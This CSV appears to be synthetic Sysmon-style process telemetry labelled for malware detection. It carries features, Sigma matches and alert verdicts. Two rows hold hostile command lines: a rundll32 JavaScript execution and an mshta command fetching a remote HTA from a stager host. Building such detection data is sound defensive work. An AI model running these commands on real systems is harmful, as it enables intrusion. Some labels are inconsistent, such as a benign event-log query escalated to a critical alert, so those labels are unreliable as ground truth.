UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-05T12:39:51.941Z,{C21A9775-BEBD-4671-8B5C-5069A7DDBC11},36269,C:\Windows\explorer.exe,explorer.exe C:\Users\mjones\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",51766,CORP\mjones,Medium,0,,,benign,0,0,0,0,38,3.987,0,0,0,0,2,0.0,0,0,1,0,0,0,1994286725,12,0,0,39,1.7891,0.05212231456900392,0.23083625528312482,0,0,1,False,None,none,,2.1271503997834893,0,explorer.exe → explorer.exe: No known suspicious pattern,False,CLEAR,NONE,0.7,
2024-07-02T01:21:47.954Z,{5A676C35-00E5-4EAB-ADF5-70CCB76E8920},4592,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update304.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,34733,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,138,5.1158,1,0,0,0,5,0.2,0,0,2,0,0,1,606078729,1,1,0,21,3.9031,4.061531127569315,1.921063484283826,0,1,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,95.25467366658246,65,"cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.5,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 95 | Chain Risk: 65
2024-07-05T11:04:23.721Z,{B24B214A-9B34-48B6-A2EC-81E1ACEEC5FB},62729,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,44393,NT AUTHORITY\SYSTEM,System,0,,,benign,2,2,0,0,33,3.7377,0,0,0,0,3,0.0,0,0,1,0,0,0,2547975307,11,0,0,4,1.8617,-0.1483481260810116,-0.14245719633795534,1,2,3,False,None,none,,8.030176162759101,0,svchost.exe → wuauclt.exe: No known suspicious pattern,False,CLEAR,NONE,2.7,
2024-07-02T12:02:17.230Z,{73F97E1F-BDC5-46D3-850A-235DBBBAE94D},36232,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,19918,CORP\admin,High,0,,,benign,0,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,12,0,0,2,1.231,1.575697663509122,1.072955136918485,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,40.52801760198716,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-03T12:48:52.500Z,{C9BA82CC-034F-4665-91F6-3BAC5234A6F7},64341,C:\Windows\System32\cmd.exe,cmd.exe /c type C:\Windows\System32\drivers\etc\hosts,C:\Windows\explorer.exe,C:\Windows\explorer.exe,48419,CORP\dbadmin,Medium,0,,,benign,0,4,1,1,53,4.3884,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,12,0,0,48,0.9208,0.6535336365190505,0.8318791412867402,0,4,1,False,None,none,,39.03453109028668,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,13.0,
2024-07-04T08:35:26.991Z,{BADD0BE9-373E-43BB-A1B3-BEBF5B6CCB04},28296,C:\Windows\System32\cmd.exe,cmd.exe /c netstat -an,C:\Windows\explorer.exe,C:\Windows\explorer.exe,37522,CORP\itops,High,0,,,benign,0,4,1,1,22,3.5383,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,8,0,0,35,0.9208,-0.5893830955110458,-0.441032062977519,0,5,2,False,None,none,,37.86802086789723,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,12.6,
2024-07-02T01:45:31.626Z,{85083010-A14E-4C33-89B9-4A8A184B5E5F},63278,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager2089.xyz/script147.hta"""""")",C:\Windows\System32\cmd.exe,explorer.exe,6768,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,1,5,1,1,101,4.8437,0,1,0,0,3,0.0,0,0,2,0,0,1,345041238,1,1,0,45,3.9031,2.5780498667591996,1.5136300780018532,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,77.40267050087473,85,"cmd.exe → mshta.exe: Command shell invoking mshta [Modifiers: +15 URL in command, +10 off-hours]",True,ALERT,CRITICAL,97.7,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 77 | Chain Risk: 85
2024-07-03T17:23:48.147Z,{BC99AF98-89E3-41F0-81E6-66C707C0F36F},14045,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,40483,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,6,0,0,48,4.5608,0,0,0,0,2,0.0,0,0,1,0,0,0,2706394319,17,0,0,23,2.2041,0.453063195869035,1.0900251142489317,1,7,3,False,None,none,,28.137488797397385,0,services.exe → searchindexer.exe: No known suspicious pattern,False,CLEAR,NONE,9.4,
2024-07-02T14:59:04.306Z,{A9F78708-BABF-4A65-BC64-A9A7CA91B81B},11646,C:\Windows\System32\cmd.exe,cmd.exe /c hostname,C:\Windows\explorer.exe,C:\Windows\explorer.exe,37959,CORP\netadmin,Medium,0,,,benign,0,4,1,1,19,3.6819,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,14,0,0,59,0.9208,-0.7096653599010552,-0.22601024327119282,0,8,1,False,None,none,,30.98098911536214,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.3,
2024-07-03T15:15:51.826Z,{78B41D90-8DFA-4AB4-8B42-AA438AB1376E},45891,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,27613,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,7,0,0,13,3.2389,0,0,0,0,1,0.0,0,0,1,0,0,0,1815403986,15,0,0,15,1.757,-0.9502298886810738,-0.8893435728666134,1,7,3,False,None,none,,21.152858684661453,0,services.exe → taskhostw.exe: No known suspicious pattern,False,CLEAR,NONE,7.1,
